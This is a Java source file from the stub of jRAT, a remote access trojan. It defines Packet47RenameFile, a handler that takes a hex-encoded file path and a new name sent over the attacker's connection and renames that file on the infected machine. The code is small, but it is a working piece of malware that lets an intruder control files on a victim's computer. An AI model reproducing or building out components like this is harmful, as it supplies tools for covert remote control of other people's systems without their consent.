package io.jrat.stub.packets.incoming;

import io.jrat.common.codec.Hex;
import io.jrat.stub.Connection;

import java.io.File;


public class Packet47RenameFile extends AbstractIncomingPacket {

	public void read(Connection con) throws Exception {
		String file = con.readLine();
		String newname = con.readLine();

		File f = new File(Hex.decode(file.substring(2, file.length())));
		File fto = new File(f.getAbsolutePath().replace(f.getName(), "") + newname);
		if (f.exists()) {
			f.renameTo(fto);
		}
	}

}
